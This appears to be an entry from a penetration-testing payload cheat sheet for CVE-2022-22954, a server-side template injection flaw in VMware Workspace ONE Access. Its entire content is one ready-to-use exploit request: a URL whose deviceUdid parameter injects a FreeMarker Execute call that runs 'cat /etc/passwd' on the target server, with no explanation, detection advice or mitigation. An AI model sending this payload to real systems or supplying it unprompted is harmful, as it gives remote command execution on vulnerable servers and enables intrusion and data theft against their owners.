# Workspace ONE Access

## CVE-2022-22954: SSTI

```
/catalog-portal/ui/oauth/verify?error=&deviceUdid=${"freemarker.template.utility.Execute"?new()("cat /etc/passwd")}
```
